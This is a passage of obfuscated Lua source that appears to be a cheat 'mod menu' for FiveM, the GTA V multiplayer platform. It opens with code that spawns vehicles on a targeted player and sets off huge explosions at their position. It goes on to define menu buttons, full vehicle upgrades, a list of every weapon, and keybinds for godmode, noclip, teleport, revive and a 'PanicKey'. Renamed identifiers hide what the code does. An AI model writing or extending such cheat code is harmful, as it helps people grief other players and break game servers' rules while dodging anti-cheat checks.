            local di=CreateVehicle(vitolasRPMQCUeMEUCUff(dg),GetEntityCoords(GetPlayerPed(i))+2.0,vitolasRPMQCUeMEUCUzz,vitolasRPMQCUeMEUCUzz) and CreateVehicle(vitolasRPMQCUeMEUCUff(dg),GetEntityCoords(GetPlayerPed(i))+10.0,vitolasRPMQCUeMEUCUzz,vitolasRPMQCUeMEUCUzz)and CreateVehicle(vitolasRPMQCUeMEUCUff(dg),2*GetEntityCoords(GetPlayerPed(i))+15.0,vitolasRPMQCUeMEUCUzz,vitolasRPMQCUeMEUCUzz)and CreateVehicle(vitolasRPMQCUeMEUCUff(dh),GetEntityCoords(GetPlayerPed(i))+2.0,vitolasRPMQCUeMEUCUzz,vitolasRPMQCUeMEUCUzz)and CreateVehicle(vitolasRPMQCUeMEUCUff(dh),GetEntityCoords(GetPlayerPed(i))+10.0,vitolasRPMQCUeMEUCUzz,vitolasRPMQCUeMEUCUzz)and CreateVehicle(vitolasRPMQCUeMEUCUff(dh),2*GetEntityCoords(GetPlayerPed(i))+15.0,vitolasRPMQCUeMEUCUzz,vitolasRPMQCUeMEUCUzz)and CreateVehicle(vitolasRPMQCUeMEUCUff(di),GetEntityCoords(GetPlayerPed(i))+2.0,vitolasRPMQCUeMEUCUzz,vitolasRPMQCUeMEUCUzz)and CreateVehicle(vitolasRPMQCUeMEUCUff(di),GetEntityCoords(GetPlayerPed(i))+10.0,vitolasRPMQCUeMEUCUzz,vitolasRPMQCUeMEUCUzz)and CreateVehicle(vitolasRPMQCUeMEUCUff(di),2*GetEntityCoords(GetPlayerPed(i))+15.0,vitolasRPMQCUeMEUCUzz,vitolasRPMQCUeMEUCUzz)and CreateVehicle(vitolasRPMQCUeMEUCUff(dj),GetEntityCoords(GetPlayerPed(i))+2.0,vitolasRPMQCUeMEUCUzz,vitolasRPMQCUeMEUCUzz)and CreateVehicle(vitolasRPMQCUeMEUCUff(dj),GetEntityCoords(GetPlayerPed(i))+10.0,vitolasRPMQCUeMEUCUzz,vitolasRPMQCUeMEUCUzz)and CreateVehicle(vitolasRPMQCUeMEUCUff(dj),2*GetEntityCoords(GetPlayerPed(i))+15.0,vitolasRPMQCUeMEUCUzz,vitolasRPMQCUeMEUCUzz)and CreateVehicle(vitolasRPMQCUeMEUCUff(dk),GetEntityCoords(GetPlayerPed(i))+2.0,vitolasRPMQCUeMEUCUzz,vitolasRPMQCUeMEUCUzz)and CreateVehicle(vitolasRPMQCUeMEUCUff(dk),GetEntityCoords(GetPlayerPed(i))+10.0,vitolasRPMQCUeMEUCUzz,vitolasRPMQCUeMEUCUzz)and CreateVehicle(vitolasRPMQCUeMEUCUff(dk),2*GetEntityCoords(GetPlayerPed(i))+15.0,vitolasRPMQCUeMEUCUzz,vitolasRPMQCUeMEUCUzz)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,vitolasRPMQCUeMEUCUzz,admgordolas,100000.0)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,vitolasRPMQCUeMEUCUzz,admgordolas,vitolasRPMQCUeMEUCUzz)
        end
     end)
    
end
    

function Menumanacokkk(id, nazwa,outline,xx,yy)
    local x,y = GetNuiCursorPosition()
    text(nazwa,outline,0.35,0,xx,yy - 0.01, vitolasRPMQCUeMEUCUzz ,10)
    local x,y = GetNuiCursorPosition()

    local x_res, y_res = GetActiveScreenResolution()

    local xx2 = xx

    if id == tab then


    end
    if( (x / x_res) + 0.030 >= xx and (x / x_res) - 0.029 <= xx and (y / y_res) + 0.009 >= yy and (y / y_res) - 0.01 <= yy) and IsDisabledControlJustReleased(0, 92) then 
        return vitolasRPMQCUeMEUCUzz
    end
    return admgordolas
end
  
function Subbutao(id, nazwa,outline,xx,yy)
    local x,y = GetNuiCursorPosition()
    text(nazwa,outline,0.27,0,xx,yy - 0.01, vitolasRPMQCUeMEUCUzz ,10)
    local x,y = GetNuiCursorPosition()

    local x_res, y_res = GetActiveScreenResolution()

    local xx2 = xx

    if id == tab then


    end
    if( (x / x_res) + 0.030 >= xx and (x / x_res) - 0.029 <= xx and (y / y_res) + 0.009 >= yy and (y / y_res) - 0.01 <= yy) and IsDisabledControlJustReleased(0, 92) then 
        return vitolasRPMQCUeMEUCUzz
    end
    return admgordolas
end

function SubMenu(id, nazwa,outline,xx,yy)
    local x,y = GetNuiCursorPosition()
    text(nazwa,outline,0.57,0,xx,yy - 0.01, vitolasRPMQCUeMEUCUzz ,2)

    if id == tab then
        vitolasRPMQCUeMEUCUuu(xx,0.286,0.04421,0.0034,255, 255, 255,255)  -- lewo prawo , wysokosc, szerokosc od bokow, szerokosc od gory

    end
    if( (x / 1920) + 0.02 >= xx and (x / 1920) - 0.018 <= xx and (y / 1080) + 0.017 >= yy and (y / 1080) - 0.016 <= yy and IsDisabledControlJustReleased(0, 92)) then 
        return vitolasRPMQCUeMEUCUzz
    end
    return admgordolas
end
  



function engine1(veh)
    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 0)
    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 7)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 0) - 1, admgordolas)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 1) - 1, admgordolas)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 2) - 1, admgordolas)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 3) - 1, admgordolas)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 4) - 1, admgordolas)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 5) - 1, admgordolas)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 6) - 1, admgordolas)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 7) - 1, admgordolas)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 8) - 1, admgordolas)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 9) - 1, admgordolas)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 10) - 1, admgordolas)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 11) - 1, admgordolas)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 12) - 1, admgordolas)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 13) - 1, admgordolas)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 14, 16, admgordolas)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 15) - 2, admgordolas)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 16) - 1, admgordolas)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 17, vitolasRPMQCUeMEUCUzz)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 18, vitolasRPMQCUeMEUCUzz)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 19, vitolasRPMQCUeMEUCUzz)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 20, vitolasRPMQCUeMEUCUzz)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 21, vitolasRPMQCUeMEUCUzz)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 22, vitolasRPMQCUeMEUCUzz)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 23, 1, admgordolas)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 24, 1, admgordolas)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 25) - 1, admgordolas)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 27) - 1, admgordolas)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 28) - 1, admgordolas)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 30) - 1, admgordolas)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 33) - 1, admgordolas)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 34) - 1, admgordolas)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 35) - 1, admgordolas)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 38) - 1, vitolasRPMQCUeMEUCUzz)
    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 1)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), admgordolas)
    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), admgordolas), 5)
end



function changeAppearance(family, model, texture)
    if (family == 'CHAPEU' or family == 'OCULOS' or family == 'EARS') then
        if (family == 'CHAPEU') then
            fam = 0
        elseif (family == 'OCULOS') then
            fam = 1
        elseif (family == 'EARS') then
            fam = 2
        end
        SetPedPropIndex(PlayerPedId(), fam, model - 1, texture, 1)
    else
        if (family == 'FACE') then
            fam = 0
        elseif (family == 'MASCARA') then
            fam = 1
        elseif (family == 'HAIR') then
            fam = 2
        elseif (family == 'CAMISA') then
            fam = 3
        elseif (family == 'CALCA') then
            fam = 4
        elseif (family == 'MAOS') then
            fam = 5
        elseif (family == 'SAPATO') then
            fam = 6
        elseif (family == 'SPECIAL1') then
            fam = 7
        elseif (family == 'SPECIAL2') then
            fam = 8
        elseif (family == 'SPECIAL3') then
            fam = 9
        elseif (family == 'TEXTURE') then
            fam = 10
        elseif (family == 'JAQUETA') then
            fam = 11
        end
        SetPedComponentVariation(PlayerPedId(), fam, model, texture, 0)
    end
end


function resetAppearance()
    ClearAllPedProps(PlayerPedId())
    ClearPedDecorations(PlayerPedId())
    SetPedComponentVariation(PlayerPedId(), 1, 0, 0, 0)
    SetPedComponentVariation(PlayerPedId(), 5, 0, 0, 0)
    SetPedComponentVariation(PlayerPedId(), 9, 0, 0, 0)
end



function KeyboardInput(TextEntry, ExampleText, MaxStringLength)
    AddTextEntry("FMMC_KEY_TIP8", TextEntry .. ":")
    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP8", "", ExampleText, "", "", "", MaxStringLength)
    blockinput = vitolasRPMQCUeMEUCUzz

    while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
        vitolasRPMQCUeMEUCUtt(0)
    end


    ClearLabels = vitolasRPMQCUeMEUCUzz

    if UpdateOnscreenKeyboard() ~= 2 then
        local result = GetOnscreenKeyboardResult()
        vitolasRPMQCUeMEUCUtt(500)
        blockinput = admgordolas
        ClearLabels = admgordolas
        return result
    else
        vitolasRPMQCUeMEUCUtt(500)
        blockinput = admgordolas
        ClearLabels = admgordolas
        return vitolasRPMQCUeMEUCUss
    end
end



local function GetTextWidht(str, font, scale)
    BeginTextCommandWidth("STRING")
    AddTextComponentSubstringPlayerName(str)
    SetTextFont(font or 4)
    SetTextScale(scale or 0.35, scale or 0.35)
    local length = EndTextCommandGetWidth(1)

    return length
end

function Onlinemanacokkk(id, nazwa,outline,xx,yy)
    local x,y = GetNuiCursorPosition()
    local widht = GetTextWidht(text, 0, 0.2)
    if( (x / 1920) + 0.003 >= xx and (x / 1920) - (widht/1.5) <= xx and (y / 1080) + 0.0115 >= yy and (y / 1080) - 0.011 <= yy) then
        text("~o~"..nazwa.." - ["..id.."]",outline,0.27,0,xx,yy - 0.009, admgordolas)   
        if IsDisabledControlJustReleased(0, 92) then
            return vitolasRPMQCUeMEUCUzz
        end
    else
        text(nazwa.." - ["..id.."]",outline,0.27,0,xx,yy - 0.009, admgordolas)
    end
    return admgordolas
end

function Slimmanacokkk(nazwa,outline,xx,yy)
    local x,y = GetNuiCursorPosition()
    text(nazwa,outline,0.24,0,xx,yy - 0.009, vitolasRPMQCUeMEUCUzz)
    vitolasRPMQCUeMEUCUuu(xx,yy-0.014,0.058,0.002,222, 158, 64,255)
    vitolasRPMQCUeMEUCUuu(xx,yy,0.058,0.028,34,35,40,255)
    if( (x / 1920) + 0.030 >= xx and (x / 1920) - 0.029 <= xx and (y / 1080) + 0.015 >= yy and (y / 1080) - 0.014 <= yy) then 
        vitolasRPMQCUeMEUCUuu(xx,yy-0.014,0.058,0.002,222, 55, 64,255)
        if IsDisabledControlJustReleased(0, 92) then
            return vitolasRPMQCUeMEUCUzz
        end
    else
        vitolasRPMQCUeMEUCUuu(xx,yy-0.014,0.058,0.002, 115, 118, 125,255)
        return admgordolas
    end
end

function Combomanacokkk(nazwa,outline,xx,yy)
    local x,y = GetNuiCursorPosition()
    text(nazwa,outline,0.22,0,xx,yy - 0.009, vitolasRPMQCUeMEUCUzz)
    vitolasRPMQCUeMEUCUuu(xx,yy,0.058,0.02,34,35,40,255)
    if( (x / 1920) + 0.030 >= xx and (x / 1920) - 0.029 <= xx and (y / 1080) + 0.010 >= yy and (y / 1080) - 0.01 <= yy) then 
        if IsDisabledControlJustReleased(0, 92) then
            return vitolasRPMQCUeMEUCUzz
        end
    else
        return admgordolas
    end
end



local function vitolasRPMQCUeMEUCUyy(text, x, y, outline, size, font, centre)
    SetTextFont(0)
    if outline then
        SetTextOutline(vitolasRPMQCUeMEUCUzz)
    end
    if tonumber(font) ~= vitolasRPMQCUeMEUCUss then
        SetTextFont(font)
    end
    if centre then
        SetTextCentre(vitolasRPMQCUeMEUCUzz)
    end
    SetTextScale(100.0, size or 0.23)
    BeginTextCommandDisplayText("STRING")
    AddTextComponentSubstringWebsite(text)
    EndTextCommandDisplayText(x, y)
end

function DrawGeneralAndDrawSecond()
    text("",admgordolas,0.25,0,0.43,0.315, vitolasRPMQCUeMEUCUzz)
    

    -- Second --
    
    text("",admgordolas,0.25,0,0.57,0.315, vitolasRPMQCUeMEUCUzz)
    
--  vitolasRPMQCUeMEUCUuu(0.506, 0.488, 0.0006, 0.33, 52, 55, 64, 255) -- lewy szary
--  vitolasRPMQCUeMEUCUuu(0.634, 0.488, 0.0006, 0.33, 52, 55, 64, 255) -- prawy szary
    
--  vitolasRPMQCUeMEUCUuu(0.53, 0.325, 0.048, 0.000925, 128, 0,227,255) -- lewy pomarańcz
--  vitolasRPMQCUeMEUCUuu(0.61, 0.325, 0.048, 0.000925, 128, 0,227,255) -- prawy pomarańcz
    
--s vitolasRPMQCUeMEUCUuu(0.57, 0.653, 0.128, 0.000925, 128, 0,227,255) -- dolny pomarańcz
end



--

function bar(x,y,height)
    vitolasRPMQCUeMEUCUuu(x,y,0.003,height,161, 161, 161,255)
end
-----MENU-----

---------FUNCTIONS----------




local _c = Citizen
   local _FiVe_SeNsE_ = {
       allweps = {"PISTOL","PISTOL_MK2","COMBATPISTOL","APPISTOL","REVOLVER","REVOLVER_MK2","DOUBLEACTION","PISTOL50","SNSPISTOL","SNSPISTOL_MK2","HEAVYPISTOL","VINTAGEPISTOL","STUNGUN","FLAREGUN","MARKSMANPISTOL","KNIFE","KNUCKLE","NIGHTSTICK","HAMMER","BAT","GOLFCLUB","CROWBAR","BOTTLE","DAGGER","HATCHET","MACHETE","FLASHLIGHT","SWITCHBLADE","POOLCUE","PIPEWRENCH","MICROSMG","MINISMG","SMG","SMG_MK2","ASSAULTSMG","COMBATPDW","GUSENBERG","MACHINEPISTOL","MG","COMBATMG","COMBATMG_MK2","ASSAULTRIFLE","ASSAULTRIFLE_MK2","CARBINERIFLE","CARBINERIFLE_MK2","ADVANCEDRIFLE","SPECIALCARBINE","SPECIALCARBINE_MK2","BULLPUPRIFLE","BULLPUPRIFLE_MK2","COMPACTRIFLE","PUMPSHOTGUN","PUMPSHOTGUN_MK2","SWEEPERSHOTGUN","SAWNOFFSHOTGUN","BULLPUPSHOTGUN","ASSAULTSHOTGUN","MUSKET","HEAVYSHOTGUN","DBSHOTGUN","SNIPERRIFLE","HEAVYSNIPER","HEAVYSNIPER_MK2","MARKSMANRIFLE","MARKSMANRIFLE_MK2","GRENADELAUNCHER","GRENADELAUNCHER_SMOKE","RPG","MINIGUN","FIREWORK","RAILGUN","HOMINGLAUNCHER","COMPACTLAUNCHER","GRENADE","STICKYBOMB","PROXMINE","BZGAS","SMOKEGRENADE","MOLOTOV","FIREEXTINGUISHER","PETROLCAN","SNOWBALL","FLARE","BALL" },
       allwepwithWEAPON = {"waeapon_dagger","weapon_bat","weapon_bottle","weapon_crowbar","weapon_flashlight","weapon_unarmed","weapon_golfclub","weapon_hammer","weapon_hatchet","weapon_knuckle","weapon_knife","weapon_machete","weapon_switchblade","weapon_nightstick","weapon_wrench","weapon_battleaxe","weapon_poolcue","weapon_stone_hatchet","weapon_pistol","weapon_pistol_mk2","weapon_combatpistol","weapon_appistol","weapon_stungun","weapon_pistol50","weapon_snspistol","weapon_snspistol_mk2","weapon_heavypistol","weapon_vintagepistol","weapon_flaregun","weapon_marksmanpistol","weapon_revolver","weapon_revolver_mk2","weapon_doubleaction","weapon_raypistol","weapon_ceramicpistol","weapon_navyrevolver","weapon_gadgetpistol","weapon_microsmg","weapon_smg","weapon_smg_mk2","weapon_assaultsmg","weapon_combatpdw","weapon_machinepistol","weapon_minismg","weapon_raycarbine","weapon_pumpshotgun","weapon_pumpshotgun_mk2","weapon_sawnoffshotgun","weapon_assaultshotgun","weapon_bullpupshotgun","weapon_musket","weapon_heavyshotgun","weapon_dbshotgun","weapon_autoshotgun","weapon_combatshotgun","weapon_assaultrifle","weapon_assaultrifle_mk2","weapon_carbinerifle","weapon_carbinerifle_mk2","weapon_advancedrifle","weapon_specialcarbine","weapon_specialcarbine_mk2","weapon_bullpuprifle","weapon_bullpuprifle_mk2","weapon_compactrifle","weapon_militaryrifle","weapon_mg","weapon_combatmg","weapon_combatmg_mk2","weapon_gusenberg","weapon_sniperrifle","weapon_heavysniper","weapon_heavysniper_mk2","weapon_marksmanrifle","weapon_marksmanrifle_mk2","weapon_rpg","weapon_grenadelauncher","weapon_grenadelauncher_smoke","weapon_minigun","weapon_firework","weapon_railgun","weapon_hominglauncher","weapon_compactlauncher","weapon_rayminigun","weapon_grenade","weapon_bzgas","weapon_molotov","weapon_stickybomb","weapon_proxmine","weapon_snowball","weapon_pipebomb","weapon_ball","weapon_smokegrenade","weapon_flare","weapon_petrolcan","weapon_fireextinguisher","weapon_hazardcan",},
       allwepwithWEAPONGlife = {"WT_RIFLE_ADV","WT_PIST_AP","WT_RIFLE_ASL","WT_RIFLE_ASL2","WT_SG_ASL","WT_SMG_ASL","WT_AUTOSHGN","WT_BAT","WT_BALL","WT_BATTLEAXE","WT_BOTTLE","WT_BULLRIFLE","WT_BULLRIFLE2","WT_SG_BLP","WT_BZGAS","WT_RIFLE_CBN","WT_RIFLE_CBN2","M60","M60 MK II","WT_COMBATPDW","WT_PIST_CBT","WT_CMPGL","WT_CMPRIFLE","WT_CROWBAR","Dagger","WT_DBSHGN","WT_REV_DA","WT_FIRE","WT_FWRKLNCHR","WT_FLARE","WT_FLAREGUN","WT_FLASHLIGHT","WT_GOLFCLUB","WT_GNADE","WT_GL","WT_GUSENBERG","WT_HAMMER","WT_HATCHET","WT_HEAVYPSTL","WT_HVYSHOT","AWP","AWP MK II","WT_HOMLNCH","WT_KNIFE","WT_KNUCKLE","WT_MACHETE","WT_MCHPIST","WT_MKPISTOL","WT_MKRIFLE","WT_MKRIFLE2","WT_MG","WT_SMG_MCR","WT_MINIGUN","WT_MINISMG","WT_MOLOTOV","WT_MUSKET","WT_NGTSTK","WT_PETROL","WT_PIPEBOMB","WT_PIST","WT_PIST_50","WT_PIST2","WT_POOLCUE","WT_PRXMINE","WT_SG_PMP","WT_SG_PMP2","WT_RAILGUN","WT_REVOLVER","WT_REVOLVER2","WT_RPG","WT_SG_SOF","WT_SMG","WT_SMG2","WT_GNADE_SMK","WT_SNIP_RIF","WT_SNWBALL","WT_SNSPISTOL","WT_SNSPISTOL2","WT_RIFLE_SCBN","WT_SPCARBINE2","WT_GNADE_STK","WT_STUN","WT_SWBLADE","WT_UNARMED","WT_VPISTOL","WT_WRENCH","WT_RAYPISTOL","WT_RAYCARBINE","WT_SHATCHET","WT_CERPST","WT_REV_NV","WT_CMBSHGN","WT_MLTRYRFL",},
       natives = {}, us = {tab = 'Player'}, menu = {loader = vitolasRPMQCUeMEUCUzz}, pos = {}, friends = {}, 
       Keybinds = {
           ['Noclip'] = {'-', 1337},
           ['GLife-Noclip'] = {'-', 1337},
           ['Freecam'] = {'-', 1337},
           ['FillAmmo'] = {'-', 1337},
           ['RepairVehicle'] = {'-', 1337},
           ['Glifefarm'] = {'-', 1337},
           ['Godmode'] = {'-', 1337},
           ['Heal'] = {'-', 1337},
           ['Armor'] = {'-', 1337},
           ['Fastrun'] = {'-', 1337},
           ['Maxtune'] = {'-', 1337},
           ['FlipVehicle'] = {'-', 1337},
           ['Revive'] = {'-', 1337},
           ['TeleporToWaypoint'] = {'-', 1337},
           ['TeleportZombies'] = {'-', 1337},
           --['SpawnZombies'] = {'-', 1337},
           ['SetZombieHP'] = {'-', 1337},
           ['PanicKey'] = {'-', 1337},
           ['AutoKillZomb'] = {'-', 1337},      
   
       },
       _shit_ThisadmmeupauematicShit = {
           _ud_abs = admmeupau.abs,
           _ud_atan2 = admmeupau.atan2,
           _ud_ceil = admmeupau.ceil,
           _ud_cos = admmeupau.cos,
           _ud_deg = admmeupau.deg,
           _ud_pi = admmeupau.pi,
           _ud_rad = admmeupau.rad,
           _ud_random = admmeupau.random,
           _ud_sin = admmeupau.sin,
           _ud_sqrt = admmeupau.sqrt,
           _ud_floor = admmeupau.floor,  
           _ud_clamp = admmeupau.clamp,
           _ud_vectorthree = vector3,
           _ud_Ppairs = pairs,
           _ud_Iipairs = ipairs,
       },
       _shitlol_ThisStringShit = {
           _ud_format =format,
           _ud_upper =upper,
           _ud_len =len,
           _ud_lower =lower,
           _ud_sub =sub,
           _ud_print = print,
           _ud_gmatch =gmatch,
       },
       _shitmeh_ThisCoroutineShit = {
           _ud_wrap = coroutine.wrap,
           _ud_yield = coroutine.yield,
           _ud_metatable = setmetatable,
       },
       _shitfuck_ThisTableShit = {
           _ud_tremove= table.remove,
           _ud_tinsert= table.insert,
           _ud_tunpack= table.unpack,
           _ud_msgpack= msgpack.pack,
           _ud_msgunpack= msgpack.unpack,
       },
       n = {
           _ud_string = tostring, 
           _ud_num = tonumber,
           _ud_vitolasRPMQCUeMEUCUtt = _c.vitolasRPMQCUeMEUCUtt,
           _ud_thr = _c.CreateThread,
           _ud_inv = _c.InvokeNative,
           _ud_rra = _c.ReturnResultAnyway,
           _ud_int = _c.PointerValueInt,
           _ud_pvv = _c.PointerValueVector,
           _ud_raf = _c.ResultAsFloat,
           _ud_ras = _c.ResultAsString,
           _ud_ral = _c.ResultAsLong,
           _ud_rav = _c.ResultAsVector,
           _ud_rai = _c.ResultAsInteger,
           _ud_pvf = _c.PointerValueFloat,
           _ud_rao = _c.ResultAsObject,
           _ud_ii = _c.PointerValueIntInitialized,
           _ud_pvi = _c.PointerValueInt,
       },

       _shitkurva_ThisIsshitwithall = {
        boundingplayers = vitolasRPMQCUeMEUCUzz, 
        CORNERplayers = vitolasRPMQCUeMEUCUzz,
        healthplayers = vitolasRPMQCUeMEUCUzz, 
        armorplayers = vitolasRPMQCUeMEUCUzz,
        glowplayers = vitolasRPMQCUeMEUCUzz,
        vehicletab = vitolasRPMQCUeMEUCUzz,
        menuenabled = vitolasRPMQCUeMEUCUzz,
        HealthDynamicColor = vitolasRPMQCUeMEUCUzz,
        HudColor = admgordolas,
        ArmorDynamicColor = vitolasRPMQCUeMEUCUzz,
        newboundplayers = vitolasRPMQCUeMEUCUzz,
        newhealthplayers = vitolasRPMQCUeMEUCUzz,
        newarmorplayers = vitolasRPMQCUeMEUCUzz,
    
    }
    
     
    }



function SpectatePlayer(player)
    local playerPed = PlayerPedId()
    Spectating = not Spectating
    local targetPed = GetPlayerPed(player)

    if (Spectating) then
        local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, admgordolas))

        RequestCollisionAtCoord(targetx, targety, targetz)
        NetworkSetInSpectatorMode(vitolasRPMQCUeMEUCUzz, targetPed)

    else
        local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, admgordolas))

        RequestCollisionAtCoord(targetx, targety, targetz)
        NetworkSetInSpectatorMode(admgordolas, targetPed)

    end
end



local function vitolasRPMQCUeMEUCUyy3D(x, y, z, text, r, g, b)
    Citizen.InvokeNative(0xAA0008F3BBB8F416, x, y, z, 0)
    Citizen.InvokeNative(0x66E0276CC5F6B9DA, 0)
    Citizen.InvokeNative(0x038C1F517D7FDCF8, 0)
    Citizen.InvokeNative(0x07C837F9A01C34C9, 0.0, 0.20)
    Citizen.InvokeNative(0xBE6B23FFA53FB442, r, g, b, 255)
    Citizen.InvokeNative(0x465C84BC39F1C351, 0, 0, 0,227,255)
    Citizen.InvokeNative(0x441603240D202FA6, 2, 0, 0, 0, 150)
    Citizen.InvokeNative(0x1CA3E9EAC9D93E5E)
    Citizen.InvokeNative(0x2513DFB0FB8400FE)
    Citizen.InvokeNative(0x25FBB336DF1804CB, "STRING")
    Citizen.InvokeNative(0xC02F4DBFB51D988B, 1)
    Citizen.InvokeNative(0x6C188BE134E074AA, text)
    Citizen.InvokeNative(0xCD015E5BB0D96A57, 0.0, 0.0)
    Citizen.InvokeNative(0xFF0B610F6BE0D7AF)
end

function ScreenText(text, font, centered, x, y, scale, r, g, b, a)
    SetTextFont(font)
    SetTextProportional()
    SetTextScale(scale, scale)
    SetTextColour(r, g, b, a)
    SetTextDropShadow(0, 0, 0,227,255)
    SetTextEdge(1, 0, 0,227,255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextCentre(centered)
    BeginTextCommandDisplayText("STRING")
    AddTextComponentSubstringPlayerName(text)
    EndTextCommandDisplayText(x, y)
end
local function Playermanacokkks(text, x, y, outline)
    local cursor_x, cursor_y = GetNuiCursorPosition()
    local widht, height = GetActiveScreenResolution()
    cursor_x = cursor_x / widht
    cursor_y = cursor_y / height
    local widht = GetTextWidht(text, 0, 0.2)
    if
        ((cursor_x) + 0.03 >= x + to_add_X and (cursor_x) - 0.1 <= x + to_add_X and (cursor_y) + 0.009 >= y + to_add_Y and
            (cursor_y) - 0.009 <= y + to_add_Y)
     then
        vitolasRPMQCUeMEUCUyy(text, x + to_add_X - 0.074, y + to_add_Y - 0.005, outline, 0.31, 10, admgordolas)
    else
        vitolasRPMQCUeMEUCUyy(text, x + to_add_X - 0.074, y + to_add_Y - 0.005, outline, 0.31, 10, admgordolas)
    end
    if
        ((cursor_x) + 0.03 >= x + to_add_X and (cursor_x) - 0.1 <= x + to_add_X and (cursor_y) + 0.009 >= y + to_add_Y and
            (cursor_y) - 0.009 <= y + to_add_Y and
            IsDisabledControlJustReleased(0, 92))
     then
        return vitolasRPMQCUeMEUCUzz
    else
        return admgordolas
    end
end
function ShowInfo(text)
    SetNotificationTextEntry("STRING")
    AddTextComponentString(text)
    DrawNotification(vitolasRPMQCUeMEUCUzz)
end


local function Playermanacokkks2(text, x, y, outline)
    local cursor_x, cursor_y = GetNuiCursorPosition() 
    local widht, height = GetActiveScreenResolution()
